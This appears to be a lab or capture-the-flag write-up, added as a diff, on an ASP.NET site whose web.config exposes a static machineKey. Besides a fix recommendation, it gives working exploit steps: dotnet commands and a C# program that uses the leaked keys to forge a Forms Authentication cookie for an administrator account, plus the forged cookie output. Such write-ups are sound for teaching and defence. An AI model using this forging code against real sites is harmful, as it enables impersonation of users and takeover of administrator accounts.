@@ -1,0 +1,97 @@
+[- RAW web.config ---]
+<system.web>
+    <compilation targetFramework="4.8" />
+    <authentication mode="Forms">
+      <forms protection="All" loginUrl="/Login" path="/" />
+    </authentication>
+    <httpRuntime enableVersionHeader="false" maxRequestLength="2048" executionTimeout="3600" />
+    <machineKey decryption="AES" decryptionKey="B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581" validation="HMACSHA256" validationKey="EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80" />
+    <customErrors mode="Off" />
+  </system.web>
+
+[- Analysis web.config ---]
+<machineKey decryption="AES" 
+decryptionKey="B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581" 
+validation="HMACSHA256" 
+validationKey="EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80" />
+
+This is the critical condition.
+Keys are static
+Algorithms are explicitly known
+No auto-generated per-machine entropy
+✅ This alone enables offline ticket generation.
+
+[- Fixing Recomendation ---]
+ <!-- Secure MachineKey -->
+  <machineKey
+      compatibilityMode="Framework45"
+      decryption="AES"
+      validation="HMACSHA256" />
+
+[- Attack Analysis ---]
+The .ASPXAUTH cookie confirms the application uses ASP.NET Forms Authentication, which relies on the machineKey for encrypting and signing authentication tickets.
+Since the web.config exposes a static machineKey with known algorithms, it is possible to generate forged Forms Authentication cookies.
+If the application trusts the ticket contents without additional server-side validation, an attacker could impersonate arbitrary users, including administrators.
+
+[- Exploit Step ---]
+# dotnet new console -o LegacyAuthConsole
+
+Welcome to .NET 9.0!
+---------------------
+SDK Version: 9.0.306
+..SNIP..
+The template "Console App" was created successfully.
+Processing post-creation actions...
+Restoring C:\Users\Administrator\LegacyAuthConsole\LegacyAuthConsole.csproj:
+Restore succeeded.
+Administrator@GOTHAM C:\Users\Administrator
+
+# cd LegacyAuthConsole
+Administrator@GOTHAM C:\Users\Administrator\LegacyAuthConsole
+
+# dotnet add package AspNetCore.LegacyAuthCookieCompat --version 2.0.5
+Build succeeded in 0.9s
+info : X.509 certificate chain validation will use the default trust store selected by .NET for code signing.
+..SNIP..
+info : Writing assets file to disk. Path: C:\Users\Administrator\LegacyAuthConsole\obj\project.assets.json
+log : Restored C:\Users\Administrator\LegacyAuthConsole\LegacyAuthConsole.csproj (in 15.32 sec).
+
+# dotnet restore
+Restore complete (0.5s)
+Build succeeded in 1.1s
+..SNIP..
+
+# notepad Program.cs
+
+# dotnet build
+Restore complete (0.5s)
+LegacyAuthConsole succeeded (1.1s) → bin\Debug\net9.0\LegacyAuthConsole.dll
+Build succeeded in 2.4s
+
+# dotnet run
+D05A3523E1356B34DC5974936C3F5208F5E8E114BCA54CC6928750857BC3D0D9EAEF5172C60EEC77F71AD103B82311D808ED3B2ECD1A6C2587ED65D22A40D230D547F7D30F69D47DF9587DDEEF4F4605F7A8F04AD432C9C5921292CF31FF572D90741B7D4616D5ED1B9446C1C72159712F23FF7A020BFF8BE1B4F01CA8EC5A23A8262F91234E08F0565723F51258D3CBB738772CF9BF327D16994D173AC9BC84BF347958D4F0DE27D470F0F70257D9B0A2EA832CFA1908EF16FE18D4CA724E21
+
+[- Code Program.cs ---]
+using System;
+using System.Security.Claims;
+using System.Threading.Tasks;
+using AspNetCore.LegacyAuthCookieCompat;
+
+class Program
+{
+    static void Main(string[] args)
+    {
+        string validationKey = "EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80";
+        string decryptionKey = "B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581";
+        var issueDate = DateTime.Now;
+        var expiryDate = issueDate.AddHours(1);
+        var formsAuthenticationTicket = new FormsAuthenticationTicket(1, "web_admin", issueDate, expiryDate, false, "Web Administrators", "/");
+        byte[] decryptionKeyBytes = HexUtils.HexToBinary(decryptionKey);
+        byte[] validationKeyBytes = HexUtils.HexToBinary(validationKey);
+        var legacyFormsAuthenticationTicketEncryptor = new LegacyFormsAuthenticationTicketEncryptor(decryptionKeyBytes, validationKeyBytes, ShaVersion.Sha256);
+        var encryptedText = legacyFormsAuthenticationTicketEncryptor.Encrypt(formsAuthenticationTicket);
+
+        Console.WriteLine(encryptedText);
+    }
+}
+
